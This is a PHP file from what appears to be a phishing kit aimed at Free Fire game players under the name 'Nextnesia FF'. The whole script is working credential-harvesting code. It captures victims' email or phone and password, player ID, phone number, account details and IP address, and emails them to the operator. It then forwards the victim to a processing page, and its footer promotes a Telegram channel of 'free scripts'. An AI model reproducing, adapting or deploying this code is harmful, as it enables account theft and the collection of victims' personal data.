<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/get_flag.php';
include 'system/geolocation.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$true = new Useragent();
$user = $true->post($_POST['user']);
$pass = $true->post($_POST['pass']);
$playid = $true->post($_POST['playid']);
$nick = $true->post($_POST['nick']);
$phone = $true->post($_POST['phone']);
$level = $true->post($_POST['level']);
$tier = $true->post($_POST['tier']);
$rpt = $true->post($_POST['rpt']);
$rpl = $true->post($_POST['rpl']);
$platform = $true->post($_POST['platform']);
$login = $true->post($_POST['log']);


// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($user == "" && $pass == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "Nextnesia FF - [$nick] | Level $level";
$pesan = '
<center>
 <div style="background: url(https://i.ibb.co/j53Pkb9/Imgku.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
ACCOUNT INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Player ID</th>
<th style="width: 65%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Player Nickname</th>
<th style="width: 65%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nomer HP</th>
<th style="width: 65%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Level</th>
<th style="width: 65%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
<th style="width: 65%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
<th style="width: 65%; text-align: center;"><b>'.$rpt.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Platform</th>
<th style="width: 65%; text-align: center;"><b>'.$platform.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Login</th>
<th style="width: 65%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP</th>
<th style="width: 65%; text-align: center;"><b>'.$scodexlive['query'].'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3399ff;" href="https://www.facebook.com/nextnesia">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6281332412122">Whatsapp</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#ff0000;" href="https://www.youtube.com/wahyuekaprayogayt">Youtube</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0AC2F9;" href="https://t.me/nextnesiasc">Free Script</a>
</div>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$true->mail($scodex, $subjek, $pesan, $headers);
echo "<form id='shagitz' method='POST' action='processing.php'>
<input type='hidden' name='user' value='$user'>
</form>
<script type='text/javascript'>document.getElementById('shagitz').submit();</script>";
}